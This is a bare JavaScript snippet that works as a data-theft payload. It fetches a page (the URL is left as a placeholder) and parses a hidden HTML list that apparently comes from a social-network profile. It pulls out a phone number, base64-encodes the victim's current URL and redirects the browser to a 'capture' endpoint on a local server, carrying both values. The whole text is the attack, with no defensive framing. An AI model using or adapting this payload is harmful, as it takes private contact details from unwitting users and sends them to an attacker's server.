var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        // Action to be performed when the document is read;
        var res = this.responseText;
        var htmlStr = /<!\-\- <ul class\="uiList(.*)<\/ul> \-\->/g.exec(res)[0].replace('<!--', '').replace('-->', '');
        var parser = new DOMParser();
        var doc = parser.parseFromString(htmlStr, "text/html");
        var phone = doc.querySelector('span[dir="ltr"]').innerHTML;
        var url = btoa(window.location.href)
        console.log(phone);

        window.location.href = "http://127.0.0.1:5000/capture/" + phone + "/" + url;
    }
};
xhttp.open("GET", "#put the url");
xhttp.send();




